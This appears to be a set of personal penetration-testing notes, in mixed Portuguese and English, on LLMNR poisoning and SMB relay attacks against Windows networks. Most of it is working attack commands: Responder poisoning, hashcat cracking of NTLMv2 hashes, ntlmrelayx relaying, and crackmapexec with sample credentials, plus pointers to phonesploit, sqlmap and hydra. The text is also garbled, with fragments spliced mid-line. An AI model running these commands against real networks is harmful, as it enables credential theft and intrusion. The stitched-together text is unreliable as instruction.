# LLMNR Poisoning 

sudo responder -I eth0 -dwP 9Using Misconfigured NFS (2049) 
hashcat –m 5600 <hashfile.txt> <wordlist.txt>

# SMB Relay Attacks

nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24

Reuniremos todas as estações de trabalho sem assinatura SMB imposta e as colocaremos em um arquivo chamado targets.txt 



Utilizaremos Responder e ntlmrelayx para nosso ataque. Devemos primeiro configurar adequadamente o Responder para desabilitar as respostas SMB e HTTP, pois elas serão encaminhadas para ntlmrelayx (e eventualmente retransmitidas).

sudo nano  /etc/responder/Responder.conf

sudo responder –I eth0 -dwP
irst look for the port adb (5555) open in which network, use phonesploit to access the device, For scanning elf files use Detect it easy 


Por fim, iniciaremos o ntlmrelayx e aguardaremos a ocorrência de um evento.

sudo ntlmrelayx.py –tf targets.txt –smb2support

crackmapexec smb 192.168.28.0/24 -u peter -d MARVEL.local -p Password123
14log4j vulnerability / bruteforce login / sglmap login form / OWAZP Zap 
6heck for NFS port(2049) open, then exploit by using NFS Or try using hydra for SSH and FTP 

